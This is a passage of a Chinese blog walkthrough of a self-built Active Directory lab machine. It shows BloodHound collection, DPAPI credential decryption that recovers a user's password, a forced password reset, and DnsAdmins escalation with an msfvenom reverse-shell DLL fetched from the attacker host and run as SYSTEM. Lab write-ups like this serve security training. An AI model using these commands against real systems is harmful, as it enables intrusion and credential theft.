+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication            已知组 S-1-5-64-10                                  必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\M</span>edium Plus Mandatory Level 标签   S-1-16-8448
+</span></span></code></pre></div><p>dnsadmin可以为dns注册黑dll，下次服务重启会获得system，但是我们没有重启服务的权限，于是抓个猎犬</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user1<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass1<span style="color:#e6db74">&#34;</span> --bloodhound --collection All --dns-server <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>这里我为了方便利用nxc去抓取，并且因为本地部署不影响，正常情况大家还是使用其他工具比较稳定</p>
+<p>tindalos并未有稳定的出站，但是我找到了一个有意思的组</p>
+<p><img src="/bicker/image-4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>存在一个dns重启组，我们假定它存在重启dns的权限，总之我们没获得什么特别有用的信息，于是回头看tindalos</p>
+<p>应用以及桌面都没有信息，转头去看dpapi,注意由于我们域环境首先查看的是Roaming也就是游离保存，域凭证一般会利用Roaming保存，而local是本机凭证保存，如果没有信息的话后续再观察</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\A</span>ppData&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    目录: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\A</span>ppData
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         8/15/2025   5:22 PM                Local
+</span></span><span style="display:flex;"><span>d-----         8/15/2025  11:18 AM                LocalLow
+</span></span><span style="display:flex;"><span>d-----         8/15/2025  11:18 AM                Roaming
+</span></span></code></pre></div><p>发现确实存在保存凭证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\C</span>redentials&gt; ls -force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    目录: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\C</span>redentials
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a-hs-         8/15/2025   6:26 PM            <span style="color:#ae81ff">326</span> A2E4656BCBABFD9279E090E8482A7141
+</span></span></code></pre></div><p>将其与masterkey一块抓取到本地解密</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>    目录: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\P</span>rotect<span style="color:#ae81ff">\S</span>-1-5-21-298176814-2846777796-698167141-1103
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a-hs-         8/15/2025  11:18 AM            <span style="color:#ae81ff">900</span> BK-BICKER
+</span></span><span style="display:flex;"><span>-a-hs-         8/15/2025   6:11 PM            <span style="color:#ae81ff">740</span> cb5f08bd-480d-4d6e-9d2d-1d18c94fcb74
+</span></span><span style="display:flex;"><span>-a-hs-         8/15/2025   6:11 PM             <span style="color:#ae81ff">24</span> Preferred
+</span></span></code></pre></div><p>利用tindalos的sid，密码，masterkey文件解密</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-dpapi masterkey -file cb5f08bd-480d-4d6e-9d2d-1d18c94fcb74 -sid S-1-5-21-298176814-2846777796-698167141-1103 -password <span style="color:#e6db74">&#39;Th3C@ll0fCtHu1hu!&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>MASTERKEYFILE<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Version     :        <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guid        : cb5f08bd-480d-4d6e-9d2d-1d18c94fcb74
+</span></span><span style="display:flex;"><span>Flags       :        <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Policy      :        <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MasterKeyLen: <span style="color:#ae81ff">00000088</span> <span style="color:#f92672">(</span>136<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>BackupKeyLen: <span style="color:#ae81ff">00000068</span> <span style="color:#f92672">(</span>104<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>CredHistLen : <span style="color:#ae81ff">00000000</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DomainKeyLen: <span style="color:#ae81ff">00000174</span> <span style="color:#f92672">(</span>372<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Decrypted key with User Key <span style="color:#f92672">(</span>MD4 protected<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Decrypted key: 0x0ff22e711e14912c168ec3943e2478081930413b24795f45028bf15992aebc0b5b0954128398441a4c2578c90e5c2da71bc678d8d5a4e66836e9f083e20eeb27
+</span></span></code></pre></div><p>再利用解密出来的masterkey解密cert</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-dpapi credential -file A2E4656BCBABFD9279E090E8482A7141 -key 0x0ff22e711e14912c168ec3943e2478081930413b24795f45028bf15992aebc0b5b0954128398441a4c2578c90e5c2da71bc678d8d5a4e66836e9f083e20eeb27Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>CREDENTIAL<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>LastWritten : 2025-08-15 10:26:22
+</span></span><span style="display:flex;"><span>Flags       : 0x00000030 <span style="color:#f92672">(</span>CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Persist     : 0x00000003 <span style="color:#f92672">(</span>CRED_PERSIST_ENTERPRISE<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Type        : 0x00000002 <span style="color:#f92672">(</span>CRED_TYPE_DOMAIN_PASSWORD<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Target      : Domain:target<span style="color:#f92672">=</span>LOCALMACHINE
+</span></span><span style="display:flex;"><span>Description : 
+</span></span><span style="display:flex;"><span>Unknown     : 
+</span></span><span style="display:flex;"><span>Username    : lihua
+</span></span><span style="display:flex;"><span>Unknown     : hello%2633
+</span></span></code></pre></div><p>成功解密出lihua的账户密码</p>
+<p><img src="/bicker/image-5.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>并且能成功登陆，查看猎犬</p>
+<p><img src="/bicker/image-6.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>发现lihua属于账户操作员组，对低权限所有用户都有通用掌控，于是我们直接能直接修改dns重启员的账户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD --host &lt;DC_IP&gt; -d &lt;域名&gt; -u &lt;管理员用户名&gt; -p &lt;管理员密码&gt; set password &lt;目标用户&gt; &lt;新密码&gt;
+</span></span></code></pre></div><p><img src="/bicker/image-7.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>利用修改账号密码登陆</p>
+<p><img src="/bicker/image-8.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="dnsadmin利用提权">dnsadmin利用提权
+</h2><p>简单来说dnsadmin能给dns服务注册一个插件dll，我们能将其替换为恶意dll，之后等待机器重启，或者能操控dns服务重启后，我们会在服务自检断开前获得少于一分钟的system权限</p>
+<p>但是需要注意注册dll的次数只有一次，所以靶机作者也在jianyin用户桌面留了信息，在进行下一步前请保存快照</p>
+<p>首先生成一个msf恶意dll载荷</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.174.129 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f dll -o rev.dll
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">460</span> bytes
+</span></span><span style="display:flex;"><span>Final size of dll file: <span style="color:#ae81ff">9216</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: rev.dll
+</span></span></code></pre></div><p>传递到靶机上，因为联网的defender远程加载难以通过，而作者在根目录设置了白名单文件夹作于便利</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\w</span>irteTEMP&gt; type re*
+</span></span><span style="display:flex;"><span>此目录已经设置了defender白名单，不想处理免杀的可以随意使用此目录
+</span></span></code></pre></div><p>不要使用evil-winrm上传，因为evil-winrm的bug，看上去上传成功其实长度是0</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://192.168.174.129/rev.dll&#34;</span> -OutFile <span style="color:#e6db74">&#34;C:\wirteTEMP\rev.dll&#34;</span>
+</span></span></code></pre></div><p>还是使用古法上传，之后利用tindalos注册此dll</p>
+<p><img src="/bicker/image-9.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>注意这一步是无法回头的，注意快照
+</span></span></code></pre></div><p>之后在jianyin用户上重启服务</p>
+<p><img src="/bicker/image-10.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>从另外一边的监听直接接受shell</p>
+<p><img src="/bicker/image-11.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>权限为system成功获取rootflag</p>
+<p><img src="/bicker/image-12.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>如果在这里没有完成操作shell就断了是正常了，服务异常自检失败后shell会断连，但是只要注册dll成功，我们随时都能通过重启获得这个shell，所以无所谓</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+        
+            <a href="/tags/%E8%87%AA%E5%BB%BA%E9%9D%B6%E6%9C%BA/">自建靶机</a>
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">使用普通用户帐户远程利用RBCD</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">血缇之书</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
